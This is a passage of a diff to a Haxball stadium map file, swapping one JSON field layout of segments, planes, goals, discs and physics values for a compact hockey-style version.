-                        -62.70078532497217,
-                        -33.82966066928442
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 240,
-            "v1": 241,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        15.36296860653656,
-                        -20.75557248627635
-                    ],
-                    "b": [
-                        66.0918947430112,
-                        -39.49632733595109
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 242,
-            "v1": 243,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        20.36296860653656,
-                        -19.755572486276353
-                    ],
-                    "b": [
-                        65.75856140967787,
-                        -36.82966066928442
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 244,
-            "v1": 245,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        24.696301939869894,
-                        -19.755572486276353
-                    ],
-                    "b": [
-                        61.425228076344524,
-                        -34.16299400261776
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 246,
-            "v1": 247,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        25.029635273203226,
-                        -18.755572486276353
-                    ],
-                    "b": [
-                        59.75856140967787,
-                        -32.49632733595108
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 248,
-            "v1": 249,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -18.029635273203226,
-                        -21.088905819609685
-                    ],
-                    "b": [
-                        -63.70078532497217,
-                        -36.49632733595109
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        }
-    ],
-    "planes": [
-        {
-            "normal": [
-                0,
-                1
-            ],
-            "dist": -240,
-            "cMask": [
-                "ball"
-            ],
-            "_data": {
-                "extremes": {
-                    "normal": [
-                        0,
-                        1
-                    ],
-                    "dist": -240,
-                    "canvas_rect": [
-                        -1417.0787703889926,
-                        -533.1897725091842,
-                        1418.6656447119365,
-                        533.1897725091842
-                    ],
-                    "a": [
-                        -1417.0787703889926,
-                        -240
-                    ],
-                    "b": [
-                        1418.6656447119365,
-                        -240
-                    ]
-                }
-            }
-        },
-        {
-            "normal": [
-                0,
-                -1
-            ],
-            "dist": -240,
-            "cMask": [
-                "ball"
-            ],
-            "_data": {
-                "extremes": {
-                    "normal": [
-                        0,
-                        -1
-                    ],
-                    "dist": -240,
-                    "canvas_rect": [
-                        -1417.0787703889926,
-                        -533.1897725091842,
-                        1418.6656447119365,
-                        533.1897725091842
-                    ],
-                    "a": [
-                        -1417.0787703889926,
-                        240
-                    ],
-                    "b": [
-                        1418.6656447119365,
-                        240
-                    ]
-                }
-            }
-        },
-        {
-            "normal": [
-                0,
-                1
-            ],
-            "dist": -270,
-            "bCoef": 0.1,
-            "_data": {
-                "extremes": {
-                    "normal": [
-                        0,
-                        1
-                    ],
-                    "dist": -270,
-                    "canvas_rect": [
-                        -1417.0787703889926,
-                        -533.1897725091842,
-                        1418.6656447119365,
-                        533.1897725091842
-                    ],
-                    "a": [
-                        -1417.0787703889926,
-                        -270
-                    ],
-                    "b": [
-                        1418.6656447119365,
-                        -270
-                    ]
-                }
-            }
-        },
-        {
-            "normal": [
-                0,
-                -1
-            ],
-            "dist": -270,
-            "bCoef": 0.1,
-            "_data": {
-                "extremes": {
-                    "normal": [
-                        0,
-                        -1
-                    ],
-                    "dist": -270,
-                    "canvas_rect": [
-                        -1417.0787703889926,
-                        -533.1897725091842,
-                        1418.6656447119365,
-                        533.1897725091842
-                    ],
-                    "a": [
-                        -1417.0787703889926,
-                        270
-                    ],
-                    "b": [
-                        1418.6656447119365,
-                        270
-                    ]
-                }
-            }
-        },
-        {
-            "normal": [
-                1,
-                0
-            ],
-            "dist": -620,
-            "bCoef": 0.1,
-            "_data": {
-                "extremes": {
-                    "normal": [
-                        1,
-                        0
-                    ],
-                    "dist": -620,
-                    "canvas_rect": [
-                        -1417.0787703889926,
-                        -533.1897725091842,
-                        1418.6656447119365,
-                        533.1897725091842
-                    ],
-                    "a": [
-                        -620,
-                        -533.1897725091842
-                    ],
-                    "b": [
-                        -620,
-                        533.1897725091842
-                    ]
-                }
-            }
-        },
-        {
-            "normal": [
-                -1,
-                0
-            ],
-            "dist": -620,
-            "bCoef": 0.1,
-            "_data": {
-                "extremes": {
-                    "normal": [
-                        -1,
-                        0
-                    ],
-                    "dist": -620,
-                    "canvas_rect": [
-                        -1417.0787703889926,
-                        -533.1897725091842,
-                        1418.6656447119365,
-                        533.1897725091842
-                    ],
-                    "a": [
-                        620,
-                        -533.1897725091842
-                    ],
-                    "b": [
-                        620,
-                        533.1897725091842
-                    ]
-                }
-            }
-        },
-        {
-            "normal": [
-                1,
-                0
-            ],
-            "dist": -620,
-            "bCoef": 0.1,
-            "cMask": [
-                "ball"
-            ],
-            "_data": {
-                "extremes": {
-                    "normal": [
-                        1,
-                        0
-                    ],
-                    "dist": -620,
-                    "canvas_rect": [
-                        -1417.0787703889926,
-                        -533.1897725091842,
-                        1418.6656447119365,
-                        533.1897725091842
-                    ],
-                    "a": [
-                        -620,
-                        -533.1897725091842
-                    ],
-                    "b": [
-                        -620,
-                        533.1897725091842
-                    ]
-                }
-            }
-        },
-        {
-            "normal": [
-                -1,
-                0
-            ],
-            "dist": -620,
-            "bCoef": 0.1,
-            "cMask": [
-                "ball"
-            ],
-            "_data": {
-                "extremes": {
-                    "normal": [
-                        -1,
-                        0
-                    ],
-                    "dist": -620,
-                    "canvas_rect": [
-                        -1417.0787703889926,
-                        -533.1897725091842,
-                        1418.6656447119365,
-                        533.1897725091842
-                    ],
-                    "a": [
-                        620,
-                        -533.1897725091842
-                    ],
-                    "b": [
-                        620,
-                        533.1897725091842
-                    ]
-                }
-            }
-        }
-    ],
-    "goals": [
-        {
-            "p0": [
-                -557.5,
-                -80
-            ],
-            "p1": [
-                -557.5,
-                80
-            ],
-            "team": "red"
-        },
-        {
-            "p0": [
-                557.5,
-                80
-            ],
-            "p1": [
-                557.5,
-                -80
-            ],
-            "team": "blue"
-        }
-    ],
-    "discs": [
-        {
-            "radius": 6.25,
-            "invMass": 1.5,
-            "pos": [
-                0,
-                0
-            ],
-            "color": "FFCC00",
-            "bCoef": 0.4,
-            "cGroup": [
-                "ball",
-                "kick",
-                "score"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "radius": 5,
-            "invMass": 0,
-            "pos": [
-                -550,
-                80
-            ],
-            "color": "FF6666"
-        },
-        {
-            "radius": 5,
-            "invMass": 0,
-            "pos": [
-                -550,
-                -80
-            ],
-            "color": "FF6666"
-        },
-        {
-            "radius": 5,
-            "invMass": 0,
-            "pos": [
-                550,
-                80
-            ],
-            "color": "6666FF"
-        },
-        {
-            "radius": 5,
-            "invMass": 0,
-            "pos": [
-                550,
-                -80
-            ],
-            "color": "6666FF"
-        },
-        {
-            "radius": 3,
-            "invMass": 0,
-            "pos": [
-                -550,
-                240
-            ],
-            "color": "FFCC00",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "radius": 3,
-            "invMass": 0,
-            "pos": [
-                -550,
-                -240
-            ],
-            "color": "FFCC00",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "radius": 3,
-            "invMass": 0,
-            "pos": [
-                550,
-                -240
-            ],
-            "color": "FFCC00",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "radius": 3,
-            "invMass": 0,
-            "pos": [
-                550,
-                240
-            ],
-            "color": "FFCC00",
-            "bCoef": 0.1,
-            "cMask": []
-        }
-    ],
-    "playerPhysics": {
-        "bCoef": 0,
-        "acceleration": 0.11,
-        "kickingAcceleration": 0.083
-    },
-    "ballPhysics": "disc0",
     "spawnDistance": 350,
-    "traits": {},
-    "joints": [],
-    "redSpawnPoints": [],
-    "blueSpawnPoints": [],
-    "canBeStored": false
-}`
+    "canBeStored": false,
+    "bg": {
+    "type": "hockey",
+    "width": 550,
+    "height": 240,
+    "kickOffRadius": 80,
+    "cornerRadius": 0
+    },
+    "vertexes":[{"x":550,"y":240,"trait":"ballArea"},{"x":550,"y":-240,"trait":"ballArea"},{"x":0,"y":270,"trait":"kickOffBarrier"},{"x":0,"y":80,"bCoef":0.15,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":180},{"x":0,"y":-80,"bCoef":0.15,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":180},{"x":0,"y":-270,"trait":"kickOffBarrier"},{"x":-550,"y":-80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,-80]},{"x":-590,"y":-80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,-80]},{"x":-590,"y":80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,80]},{"x":-550,"y":80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,80]},{"x":550,"y":-80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[700,-80]},{"x":590,"y":-80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[700,-80]},{"x":590,"y":80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[700,80]},{"x":550,"y":80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[700,80]},{"x":-550,"y":80,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8","pos":[-700,80]},{"x":-550,"y":240,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8"},{"x":-550,"y":-80,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8","pos":[-700,-80]},{"x":-550,"y":-240,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8"},{"x":-550,"y":240,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":550,"y":240,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":550,"y":80,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","pos":[700,80]},{"x":550,"y":240,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea"},{"x":550,"y":-240,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8"},{"x":550,"y":-80,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8","pos":[700,-80]},{"x":550,"y":-240,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":550,"y":-240,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":-550,"y":-240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0},{"x":550,"y":-240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0},{"x":0,"y":-240,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"x":0,"y":-80,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"x":0,"y":80,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"x":0,"y":240,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"x":0,"y":-80,"bCoef":0.1,"cMask":["red","blue"],"trait":"kickOffBarrier","vis":true,"color":"F8F8F8"},{"x":0,"y":80,"bCoef":0.1,"cMask":["red","blue"],"trait":"kickOffBarrier","vis":true,"color":"F8F8F8"},{"x":0,"y":80,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":-180},{"x":0,"y":-80,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":-180},{"x":0,"y":80,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":0},{"x":0,"y":-80,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":0},{"x":-557.5,"y":80,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0,"vis":false,"pos":[-700,80]},{"x":-557.5,"y":240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0,"vis":false},{"x":-557.5,"y":-240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","vis":false,"curve":0},{"x":-557.5,"y":-80,"bCoef":1,"cMask":["ball"],"trait":"ballArea","vis":false,"curve":0,"pos":[-700,-80]},{"x":557.5,"y":-240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","vis":false,"curve":0},{"x":557.5,"y":-80,"bCoef":1,"cMask":["ball"],"trait":"ballArea","vis":false,"curve":0,"pos":[700,-80]},{"x":557.5,"y":80,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0,"vis":false,"pos":[700,80]},{"x":557.5,"y":240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0,"vis":false},{"x":0,"y":-80,"bCoef":0.1,"trait":"line"},{"x":0,"y":80,"bCoef":0.1,"trait":"line"},{"x":-550,"y":-80,"bCoef":0.1,"trait":"line"},{"x":-550,"y":80,"bCoef":0.1,"trait":"line"},{"x":550,"y":-80,"bCoef":0.1,"trait":"line"},{"x":550,"y":80,"bCoef":0.1,"trait":"line"},{"x":-240,"y":256,"bCoef":0.1,"trait":"line"},{"x":-120,"y":256,"bCoef":0.1,"trait":"line"},{"x":-240,"y":-256,"bCoef":0.1,"trait":"line"},{"x":-120,"y":-224,"bCoef":0.1,"trait":"line"},{"x":-120,"y":-256,"bCoef":0.1,"trait":"line"},{"x":240,"y":256,"bCoef":0.1,"trait":"line"},{"x":120,"y":224,"bCoef":0.1,"trait":"line"},{"x":120,"y":256,"bCoef":0.1,"trait":"line"},{"x":240,"y":-224,"bCoef":0.1,"trait":"line"},{"x":240,"y":-256,"bCoef":0.1,"trait":"line"},{"x":120,"y":-224,"bCoef":0.1,"trait":"line"},{"x":120,"y":-256,"bCoef":0.1,"trait":"line"},{"x":-381,"y":240,"bCoef":0.1,"trait":"line"},{"x":-381,"y":256,"bCoef":0.1,"trait":"line"},{"x":-550,"y":200,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":-390,"y":70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-550,"y":226,"bCoef":0.1,"trait":"line","curve":-90},{"x":-536,"y":240,"bCoef":0.1,"trait":"line","curve":-90},{"x":-550,"y":-200,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":-390,"y":-70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-550,"y":-226,"bCoef":0.1,"trait":"line","curve":90},{"x":-536,"y":-240,"bCoef":0.1,"trait":"line","curve":90},{"x":-556,"y":123,"bCoef":0.1,"trait":"line"},{"x":-575,"y":123,"bCoef":0.1,"trait":"line"},{"x":556,"y":123,"bCoef":0.1,"trait":"line"},{"x":575,"y":123,"bCoef":0.1,"trait":"line"},{"x":-556,"y":-123,"bCoef":0.1,"trait":"line"},{"x":-575,"y":-123,"bCoef":0.1,"trait":"line"},{"x":556,"y":-123,"bCoef":0.1,"trait":"line"},{"x":575,"y":-123,"bCoef":0.1,"trait":"line"},{"x":-381,"y":-240,"bCoef":0.1,"trait":"line"},{"x":-381,"y":-256,"bCoef":0.1,"trait":"line"},{"x":381,"y":240,"bCoef":0.1,"trait":"line"},{"x":381,"y":256,"bCoef":0.1,"trait":"line"},{"x":381,"y":-240,"bCoef":0.1,"trait":"line"},{"x":381,"y":-256,"bCoef":0.1,"trait":"line"},{"x":550,"y":-226,"bCoef":0.1,"trait":"line","curve":-90},{"x":536,"y":-240,"bCoef":0.1,"trait":"line","curve":-90},{"x":550,"y":226,"bCoef":0.1,"trait":"line","curve":90},{"x":536,"y":240,"bCoef":0.1,"trait":"line","curve":90},{"x":550,"y":200,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":390,"y":70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":550,"y":-200,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":390,"y":-70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":390,"y":70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":390,"y":-70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-375,"y":1,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":-1,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":3,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":-3,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":-2,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":2,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":-3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":1,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":-1,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":3,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":-3,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":-2,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":2,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":-3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":1,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":-1,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":3,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":-3,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":-2,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":2,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":-3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":1,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":-1,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":3,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":-3,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":-2,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":2,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":-3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":3.5,"bCoef":0.1,"trait":"line","curve":180}],"segments":[{"v0":6,"v1":7,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[-700,-80],"y":-80},{"v0":7,"v1":8,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","x":-590},{"v0":8,"v1":9,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[-700,80],"y":80},{"v0":10,"v1":11,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[700,-80],"y":-80},{"v0":11,"v1":12,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","x":590},{"v0":12,"v1":13,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[700,80],"y":80},{"v0":2,"v1":3,"trait":"kickOffBarrier"},{"v0":3,"v1":4,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.15,"cGroup":["blueKO"],"trait":"kickOffBarrier"},{"v0":3,"v1":4,"curve":-180,"vis":true,"color":"F8F8F8","bCoef":0.15,"cGroup":["redKO"],"trait":"kickOffBarrier"},{"v0":4,"v1":5,"trait":"kickOffBarrier"},{"v0":14,"v1":15,"vis":true,"color":"F8F8F8","bCoef":1.15,"cMask":["ball"],"trait":"ballArea","x":-550},{"v0":16,"v1":17,"vis":true,"color":"F8F8F8","bCoef":1.15,"cMask":["ball"],"trait":"ballArea","x":-550},{"v0":18,"v1":19,"vis":true,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","y":240},{"v0":20,"v1":21,"vis":true,"color":"F8F8F8","bCoef":1.15,"cMask":["ball"],"trait":"ballArea","x":550},{"v0":22,"v1":23,"vis":true,"color":"F8F8F8","bCoef":1.15,"cMask":["ball"],"trait":"ballArea","x":550},{"v0":24,"v1":25,"vis":true,"color":"F8F8F8","bCoef":0,"cMask":["ball"],"trait":"ballArea","x":550,"y":-240},{"v0":26,"v1":27,"curve":0,"vis":true,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","y":-240},{"v0":28,"v1":29,"vis":true,"color":"F8F8F8","bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"v0":30,"v1":31,"vis":true,"color":"F8F8F8","bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"v0":38,"v1":39,"curve":0,"vis":false,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":-557.5},{"v0":40,"v1":41,"curve":0,"vis":false,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":-557.5},{"v0":42,"v1":43,"curve":0,"vis":false,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":557.5},{"v0":44,"v1":45,"curve":0,"vis":false,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":557.5},{"v0":46,"v1":47,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":0},{"v0":48,"v1":49,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-550},{"v0":50,"v1":51,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":550},{"v0":64,"v1":65,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-381},{"v0":66,"v1":67,"curve":-90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":69,"v1":68,"curve":-90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":70,"v1":71,"curve":90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":67,"v1":71,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":73,"v1":72,"curve":90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":74,"v1":75,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":123},{"v0":76,"v1":77,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":123},{"v0":78,"v1":79,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":-123},{"v0":80,"v1":81,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":-123},{"v0":82,"v1":83,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-381},{"v0":84,"v1":85,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":381},{"v0":86,"v1":87,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":381},{"v0":89,"v1":88,"curve":-90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":91,"v1":90,"curve":90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":92,"v1":93,"curve":90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":94,"v1":95,"curve":-90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":96,"v1":97,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":390},{"v0":99,"v1":98,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":98,"v1":99,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":101,"v1":100,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":100,"v1":101,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":103,"v1":102,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":102,"v1":103,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":105,"v1":104,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":104,"v1":105,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":107,"v1":106,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":106,"v1":107,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":109,"v1":108,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":108,"v1":109,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":111,"v1":110,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":110,"v1":111,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":113,"v1":112,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":112,"v1":113,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":115,"v1":114,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":114,"v1":115,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":117,"v1":116,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":116,"v1":117,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":119,"v1":118,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":118,"v1":119,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":121,"v1":120,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":120,"v1":121,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":123,"v1":122,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":122,"v1":123,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":125,"v1":124,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":124,"v1":125,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":127,"v1":126,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":126,"v1":127,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":129,"v1":128,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5},{"v0":128,"v1":129,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":277.5}],"goals":[{"p0":[-557.5,-80],"p1":[-557.5,80],"team":"red"},{"p0":[557.5,80],"p1":[557.5,-80],"team":"blue"}],"discs":[{"radius":5,"pos":[-550,80],"color":"FF6666","trait":"goalPost","y":80},{"radius":5,"pos":[-550,-80],"color":"FF6666","trait":"goalPost","y":-80,"x":-560},{"radius":5,"pos":[550,80],"color":"6666FF","trait":"goalPost","y":80},{"radius":5,"pos":[550,-80],"color":"6666FF","trait":"goalPost","y":-80},{"radius":3,"invMass":0,"pos":[-550,240],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[-550,-240],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[550,-240],"color":"FFCC00","bCoef":0.1,"trait":"line"},{"radius":3,"invMass":0,"pos":[550,240],"color":"FFCC00","bCoef":0.1,"trait":"line"}],"planes":[{"normal":[0,1],"dist":-240,"bCoef":1,"trait":"ballArea","vis":false,"curve":0},{"normal":[0,-1],"dist":-240,"bCoef":1,"trait":"ballArea"},{"normal":[0,1],"dist":-270,"bCoef":0.1},{"normal":[0,-1],"dist":-270,"bCoef":0.1},{"normal":[1,0],"dist":-620,"bCoef":0.1},{"normal":[-1,0],"dist":-620,"bCoef":0.1},{"normal":[1,0],"dist":-620,"bCoef":0.1,"trait":"ballArea","vis":false,"curve":0},{"normal":[-1,0],"dist":-620,"bCoef"